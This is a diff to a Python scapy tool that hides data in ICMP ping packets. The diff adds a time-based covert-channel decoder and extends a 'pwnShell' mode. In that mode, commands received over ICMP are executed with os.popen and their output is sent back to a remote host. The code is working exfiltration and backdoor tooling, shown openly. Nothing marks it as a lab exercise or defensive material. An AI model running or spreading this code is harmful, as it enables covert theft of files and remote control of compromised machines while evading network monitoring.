@@ -25,6 +25,26 @@ def raw(p):
 def isICMP(p):
     return p.haslayer(ICMP) and p[ICMP].type==8
 
+def timeBasedCommunication(interface):
+
+    s = sniff(iface=interface, lfilter = lambda packet : isICMP(packet),
+              stop_filter = lambda packet : isICMP(packet) and '\n' in raw(packet))
+
+    # if interface is loopback for testing purposes,
+    # each packet is duplicated so we need to remove it
+
+    if interface == "lo":
+        s = [s[i] for i in range(len(s)) if i % 2 == 0]
+
+    msg = "1"
+
+    for n in range(1, len(s)):
+        diff = int((s[n].time - s[n-1].time) * 10)
+        msg += (diff- (1 * (diff % 2 != 0)))/2 * "0" +  ("1" * (diff % 2 != 0))
+
+    data = hex(int(msg, 2))[2:].replace("L", "").decode("hex")
+
+    return data
 
 def lastBytesCommunication(interface):
     s = sniff(iface=interface, lfilter = lambda packet : isICMP(packet),
@@ -72,15 +92,16 @@ def exfiltrateLastBytes(data, ip, src, verbose):
         print "[*] Message sent to {}".format(ip)
 
 # - time-based (send in time sequence)
-def exfiltrateTimeBased(data, ip, src):
+def exfiltrateTimeBased(data, ip, src, verbose):
 
     seq = bin(int((data).encode("hex"), 16))
 
-    print "[*] Destination of data: {}".format(ip)
-    if src:
-        print "[*] Sending encoded file: {}".format(src)
-    else:
-        print "[*] Sending encoded message: \"{}\"".format(data)
+    if verbose:
+        print "[*] Destination of data: {}".format(ip)
+        if src:
+            print "[*] Sending encoded file: {}".format(src)
+        else:
+            print "[*] Sending encoded message: \"{}\"".format(data)
 
     for i in seq[2:]:
         sleep(.1)
@@ -89,8 +110,10 @@ def exfiltrateTimeBased(data, ip, src):
         else:
             sleep(.1)
 
-    print "[*] Message sent to {}".format(ip)
     os.system("ping -c1 -p {} {} > /dev/null".format("0a", ip))
+
+    if verbose:
+        print "[*] Message sent to {}".format(ip)
 
 def server(interface, mode):
 
@@ -111,19 +134,27 @@ def server(interface, mode):
 
 def pwnShell(interface, mode, ip, receiver):
 
+    verbose = 0
+
     while True:
         if receiver:
-            data = ""
-            while data == "":
-                data = server(interface, mode)
+            data = server(interface, mode)
             cmd = os.popen(data).read()
-            exfiltrateLastBytes(cmd, ip, "", 0)
+            if mode == 1:
+                exfiltrateLastBytes(cmd, ip, "", verbose)
+            elif mode == 2:
+                exfiltrateTimeBased(cmd, ip, "", verbose)
+            else:
+                return
         else:
             cmd = raw_input("> ")
-            exfiltrateLastBytes(cmd, ip, "", 0)
-            data = ""
-            while data == "":
-                data = server(interface, mode)
+            if mode == 1:
+                exfiltrateLastBytes(cmd, ip, "", verbose)
+            elif mode == 2:
+                exfiltrateTimeBased(cmd, ip, "", verbose)
+            else:
+                return
+            data = server(interface, mode)
             print data.strip()
 
 if __name__ == "__main__":
@@ -131,6 +162,7 @@ if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='Client that sends data disguised in ICMP packets. Keep in mind settings need to be the same for the server')
     parser.add_argument('-m', '--mode', type=int, default=1, help='the mode of exfiltration: 1 is lousy (inside packets), 2 time-based')
     parser.add_argument('-i', '--interface', type=str, help='interface to listen on (if shell mode)', required=True)
+    parser.add_argument('-s', '--shell', help='use shell option', required=True, action='store_true')
 
     dataArgs = parser.add_mutually_exclusive_group(required=True)
     dataArgs.add_argument('-f', '--file', type=str, help='file to be sent')
@@ -142,17 +174,16 @@ if __name__ == "__main__":
     args = parser.parse_args()
 
     data = args.data
+    ip = args.host
 
     if args.file:
         data = dataFile(args.file)
 
-    ip = args.host
+    if args.shell:
+        pwnShell(args.interface, args.mode, ip, 0)
 
-    """
-    if 1:
+    else:
         if args.mode == 1:
             exfiltrateLastBytes(data, ip, args.file, 1)
         elif args.mode == 2:
-            exfiltrateTimeBased(data, ip, args.file)
-    """
-    pwnShell(args.interface, args.mode, ip, 0)
+            exfiltrateTimeBased(data, ip, args.file, 1)
